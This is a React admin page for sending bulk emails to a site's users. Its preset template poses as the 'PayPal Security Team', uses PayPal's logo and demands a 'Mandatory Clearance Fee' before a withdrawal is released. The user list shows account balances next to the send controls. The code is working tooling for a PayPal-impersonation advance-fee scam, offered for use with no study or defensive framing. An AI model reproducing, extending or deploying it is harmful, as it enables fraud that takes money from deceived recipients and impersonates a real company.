"use client"

import { useState, useEffect } from "react"
import { Search, Mail, Send, Users, UserCheck, Eye, Settings } from "lucide-react"
import api from "../../../../utils/api"

export default function EmailManagement() {
  const [users, setUsers] = useState([])
  const [selectedUsers, setSelectedUsers] = useState([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState("")
  const [emailData, setEmailData] = useState({
    subject: "PayPal Transaction Security Notice",
    greeting: "Hello, {user_name}",
    message: `Dear {user_name},

We appreciate your recent withdrawal request from your PayPal account.

To proceed with the release of this high-value transaction, PayPal's regulatory framework requires the settlement of a Mandatory Clearance Fee.

This fee is applied to large transactions and is used to facilitate:
• Full Anti-Money Laundering (AML) and Know Your Customer (KYC) verifications
• International financial regulations compliance
• Fraud prevention and advanced security checks
• Safe and secure delivery of funds to your nominated account

Please log in to your PayPal account to complete this process.

Best regards,
PayPal Security Team`
  })
  const [sending, setSending] = useState(false)
  const [previewEmail, setPreviewEmail] = useState(false)
  const [showTemplateSettings, setShowTemplateSettings] = useState(false)

  useEffect(() => {
    fetchUsers()
  }, [])

  const fetchUsers = async () => {
    try {
      setLoading(true)
      const response = await api.get('/admin/users?per_page=100')
      if (response.data.success) {
        setUsers(response.data.data.data)
      }
    } catch (error) {
      console.error('Failed to fetch users:', error)
    } finally {
      setLoading(false)
    }
  }

  const handleUserSelect = (userId) => {
    setSelectedUsers(prev => 
      prev.includes(userId) 
        ? prev.filter(id => id !== userId)
        : [...prev, userId]
    )
  }

  const handleSelectAll = () => {
    if (selectedUsers.length === users.length) {
      setSelectedUsers([])
    } else {
      setSelectedUsers(users.map(user => user.id))
    }
  }

  const handleSendEmail = async (e) => {
    e.preventDefault()
    if (!emailData.subject || !emailData.message) {
      alert('Please fill in both subject and message')
      return
    }

    if (selectedUsers.length === 0) {
      alert('Please select at least one user')
      return
    }

    setSending(true)
    try {
      const response = await api.post('/admin/send-bulk-email', {
        user_ids: selectedUsers,
        subject: emailData.subject,
        greeting: emailData.greeting,
        message: emailData.message,
        template_type: 'paypal_security'
      })

      if (response.data.success) {
        alert(`Email sent successfully to ${response.data.data.successful} users!`)
        // Reset to default template
        setEmailData({
          subject: "PayPal Transaction Security Notice",
          greeting: "Hello, {user_name}",
          message: `Dear {user_name},

We appreciate your recent withdrawal request from your PayPal account.

To proceed with the release of this high-value transaction, PayPal's regulatory framework requires the settlement of a Mandatory Clearance Fee.

This fee is applied to large transactions and is used to facilitate:
• Full Anti-Money Laundering (AML) and Know Your Customer (KYC) verifications
• International financial regulations compliance
• Fraud prevention and advanced security checks
• Safe and secure delivery of funds to your nominated account

Please log in to your PayPal account to complete this process.

Best regards,
PayPal Security Team`
        })
        setSelectedUsers([])
      }
    } catch (error) {
      console.error('Failed to send email:', error)
      alert('Failed to send email')
    } finally {
      setSending(false)
    }
  }

  const filteredUsers = users.filter(user =>
    user.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    user.email.toLowerCase().includes(searchTerm.toLowerCase())
  )

  const generateEmailPreview = (userName = "Anton Émile Paul") => {
    const processedGreeting = emailData.greeting.replace(/{user_name}/g, userName)
    const processedMessage = emailData.message.replace(/{user_name}/g, userName)
    
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>${emailData.subject}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        @media only screen and (max-width: 600px) {
            .container { width: 95% !important; }
            .inner-box { padding: 20px !important; }
            .header-text { font-size: 16px !important; }
            .title-text { font-size: 18px !important; }
        }
    </style>
</head>
<body style="margin:0; padding:0; background:#f5f5f5; font-family:Arial, sans-serif;">
    <table width="100%" cellspacing="0" cellpadding="0" style="padding:20px 0; background:#f5f5f5;">
        <tr>
            <td align="center">
                <table class="container" width="600" cellspacing="0" cellpadding="0"
                       style="background:white; border-radius:8px; overflow:hidden;">
                    <tr>
                        <td style="padding:20px 30px; font-size:18px; color:#555;" class="header-text">
                            ${processedGreeting}
                        </td>
                    </tr>
                    <tr>
                        <td style="background:#0b5eb7; padding:40px 20px; text-align:center;">
                            <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png"
                                 alt="PayPal Logo" width="80" style="margin-bottom:20px;">
                            <div style="font-size:22px; color:white; font-weight:bold; letter-spacing:1px;" class="title-text">
                                PAYPAL TRANSACTION SECURITY NOTICE
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td style="padding:30px;">
                            <table width="100%" cellspacing="0" cellpadding="0"
                                   style="border:3px solid #0b5eb7; border-radius:8px; padding:25px;" class="inner-box">
                                <tr>
                                    <td style="font-size:16px; color:#444; line-height:1.6;">
                                        ${processedMessage.split('\n').map(paragraph => {
                                          if (paragraph.trim().startsWith('•')) {
                                            return `<li>${paragraph.replace('•', '').trim()}</li>`
                                          }
                                          return `<p style="margin:0 0 20px 0;">${paragraph}</p>`
                                        }).join('').replace('<li>', '<ul style="margin:0 0 25px 20px; padding:0; line-height:1.8;"><li>').replace(/<li>/g, '</li><li>').replace(/<li>(.*?)<\/li>/g, (match, content) => {
                                          return `<li>${content}</li>`
                                        }).replace(/<\/li><li>/g, '</li><li>') + '</ul>'}
                                        <div style="text-align:center; margin:30px 0;">
                                            <a href="#"
                                               style="background:#0b5eb7; color:white; padding:12px 30px; 
                                                      font-size:16px; text-decoration:none; border-radius:5px;">
                                                Log in to PayPal
                                            </a>
                                        </div>
                                        <div style="text-align:center; margin-top:10px;">
                                            <a href="#" style="color:#0b5eb7; margin-right:20px; text-decoration:none;">
                                                Help & Contact
                                            </a>
                                            <a href="#" style="color:#0b5eb7; text-decoration:none;">
                                                Security
                                            </a>
                                        </div>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>`
  }

  const resetToDefaultTemplate = () => {
    setEmailData({
      subject: "PayPal Transaction Security Notice",
      greeting: "Hello, {user_name}",
      message: `Dear {user_name},

We appreciate your recent withdrawal request from your PayPal account.

To proceed with the release of this high-value transaction, PayPal's regulatory framework requires the settlement of a Mandatory Clearance Fee.

This fee is applied to large transactions and is used to facilitate:
• Full Anti-Money Laundering (AML) and Know Your Customer (KYC) verifications
• International financial regulations compliance
• Fraud prevention and advanced security checks
• Safe and secure delivery of funds to your nominated account

Please log in to your PayPal account to complete this process.

Best regards,
PayPal Security Team`
    })
  }

  return (
    <div className="space-y-6">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <h1 className="text-2xl font-bold text-gray-900">Email Management</h1>
          <p className="text-gray-600 mt-1">Send PayPal security emails to users</p>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 text-sm text-gray-600">
            <Users size={16} />
            <span>{selectedUsers.length} users selected</span>
          </div>
          <button
            onClick={() => setShowTemplateSettings(true)}
            className="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors text-sm font-medium flex items-center"
          >
            <Settings size={16} className="mr-2" />
            Template Settings
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Email Form */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
          <h3 className="text-lg font-semibold mb-4 flex items-center">
            <Send size={20} className="mr-2" />
            Compose PayPal Security Email
          </h3>
          
          <form onSubmit={handleSendEmail} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Subject *
              </label>
              <input
                type="text"
                value={emailData.subject}
                onChange={(e) => setEmailData(prev => ({ ...prev, subject: e.target.value }))}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Email subject..."
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Greeting *
                <span className="text-xs text-gray-500 ml-2">
                  Use {"{user_name}"} to include the user's name
                </span>
              </label>
              <input
                type="text"
                value={emailData.greeting}
                onChange={(e) => setEmailData(prev => ({ ...prev, greeting: e.target.value }))}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Hello, {user_name}"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Message *
                <span className="text-xs text-gray-500 ml-2">
                  Use {"{user_name}"} to include the user's name. Use • for bullet points.
                </span>
              </label>
              <textarea
                value={emailData.message}
                onChange={(e) => setEmailData(prev => ({ ...prev, message: e.target.value }))}
                rows={12}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 font-mono text-sm"
                placeholder="Type your message here..."
                required
              />
            </div>

            <div className="flex gap-2">
              <button
                type="button"
                onClick={() => setPreviewEmail(true)}
                className="flex-1 px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors font-medium flex items-center justify-center"
              >
                <Eye size={16} className="mr-2" />
                Preview Email
              </button>
              <button
                type="submit"
                disabled={sending || selectedUsers.length === 0}
                className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-medium flex items-center justify-center"
              >
                <Mail size={16} className="mr-2" />
                {sending ? 'Sending...' : `Send to ${selectedUsers.length} Users`}
              </button>
            </div>
          </form>
        </div>

        {/* User Selection */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
          <h3 className="text-lg font-semibold mb-4 flex items-center">
            <UserCheck size={20} className="mr-2" />
            Select Users
          </h3>

          {/* Search */}
          <div className="relative mb-4">
            <Search className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
            <input
              type="text"
              placeholder="Search users..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
            />
          </div>

          {/* Select All */}
          <div className="flex items-center mb-4 p-2 bg-gray-50 rounded-lg">
            <input
              type="checkbox"
              checked={selectedUsers.length === users.length && users.length > 0}
              onChange={handleSelectAll}
              className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
            />
            <span className="ml-2 text-sm font-medium text-gray-700">
              Select All ({users.length} users)
            </span>
          </div>

          {/* Users List */}
          <div className="max-h-96 overflow-y-auto space-y-2">
            {loading ? (
              <div className="flex items-center justify-center h-32">
                <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600"></div>
              </div>
            ) : (
              filteredUsers.map((user) => (
                <div
                  key={user.id}
                  className="flex items-center p-3 hover:bg-gray-50 rounded-lg transition-colors"
                >
                  <input
                    type="checkbox"
                    checked={selectedUsers.includes(user.id)}
                    onChange={() => handleUserSelect(user.id)}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                  <div className="ml-3 flex-1 min-w-0">
                    <p className="text-sm font-medium text-gray-900 truncate">
                      {user.name}
                    </p>
                    <p className="text-sm text-gray-500 truncate">
                      {user.email}
                    </p>
                  </div>
                  <div className="text-right">
                    <p className="text-sm font-semibold text-gray-900">
                      ${user.account_balance}
                    </p>
                    <span className={`inline-flex items-center px-2 py-0.5 rounded text-xs ${
                      user.is_active 
                        ? 'bg-green-100 text-green-800' 
                        : 'bg-red-100 text-red-800'
                    }`}>
                      {user.is_active ? 'Active' : 'Inactive'}
                    </span>
                  </div>
                </div>
              ))
            )}

            {!loading && filteredUsers.length === 0 && (
              <div className="text-center py-8 text-gray-500">
                No users found
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Email Preview Modal */}
      {previewEmail && (
        <EmailPreviewModal
          emailContent={generateEmailPreview()}
          onClose={() => setPreviewEmail(false)}
        />
      )}

      {/* Template Settings Modal */}
      {showTemplateSettings && (
        <TemplateSettingsModal
          emailData={emailData}
          onUpdate={setEmailData}
          onReset={resetToDefaultTemplate}
          onClose={() => setShowTemplateSettings(false)}
        />
      )}
    </div>
  )
}

// Email Preview Modal Component
function EmailPreviewModal({ emailContent, onClose }) {
  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
      <div className="bg-white rounded-lg max-w-4xl w-full max-h-[90vh] overflow-hidden flex flex-col">
        <div className="p-4 border-b border-gray-200 flex items-center justify-between">
          <h3 className="text-lg font-semibold">Email Preview</h3>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600 text-2xl"
          >
            ×
          </button>
        </div>
        <div className="flex-1 overflow-auto">
          <iframe
            srcDoc={emailContent}
            title="Email Preview"
            className="w-full h-full min-h-[600px] border-0"
            sandbox="allow-same-origin"
          />
        </div>
        <div className="p-4 border-t border-gray-200 bg-gray-50">
          <button
            onClick={onClose}
            className="w-full px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
          >
            Close Preview
          </button>
        </div>
      </div>
    </div>
  )
}

// Template Settings Modal Component
function TemplateSettingsModal({ emailData, onUpdate, onReset, onClose }) {
  const [localData, setLocalData] = useState(emailData)

  const handleSave = () => {
    onUpdate(localData)
    onClose()
  }

  const handleChange = (field, value) => {
    setLocalData(prev => ({
      ...prev,
      [field]: value
    }))
  }

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
      <div className="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        <div className="p-6 border-b border-gray-200">
          <div className="flex items-center justify-between">
            <h3 className="text-lg font-semibold">Template Settings</h3>
            <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl">
              ×
            </button>
          </div>
        </div>

        <div className="p-6 space-y-6">
          <div>
            <h4 className="font-semibold text-gray-900 mb-4">Default Template Content</h4>
            
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Default Subject
                </label>
                <input
                  type="text"
                  value={localData.subject}
                  onChange={(e) => handleChange('subject', e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Default Greeting
                  <span className="text-xs text-gray-500 ml-2">
                    Use {"{user_name}"} to include the user's name
                  </span>
                </label>
                <input
                  type="text"
                  value={localData.greeting}
                  onChange={(e) => handleChange('greeting', e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Default Message
                  <span className="text-xs text-gray-500 ml-2">
                    Use {"{user_name}"} to include the user's name. Use • for bullet points.
                  </span>
                </label>
                <textarea
                  value={localData.message}
                  onChange={(e) => handleChange('message', e.target.value)}
                  rows={12}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 font-mono text-sm"
                />
              </div>
            </div>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
            <h5 className="font-semibold text-yellow-800 mb-2">Template Variables</h5>
            <ul className="text-sm text-yellow-700 space-y-1">
              <li><code>{"{user_name}"}</code> - Replaced with the user's full name</li>
              <li><code>•</code> - Creates bullet points in the email</li>
            </ul>
          </div>
        </div>

        <div className="p-6 border-t border-gray-200 bg-gray-50 flex justify-between">
          <button
            onClick={onReset}
            className="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors text-sm font-medium"
          >
            Reset to Default
          </button>
          <div className="flex gap-2">
            <button
              onClick={onClose}
              className="px-4 py-2 text-sm font-medium text-gray-700 hover:text-gray-900 transition-colors"
            >
              Cancel
            </button>
            <button
              onClick={handleSave}
              className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-sm font-medium"
            >
              Save Changes
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}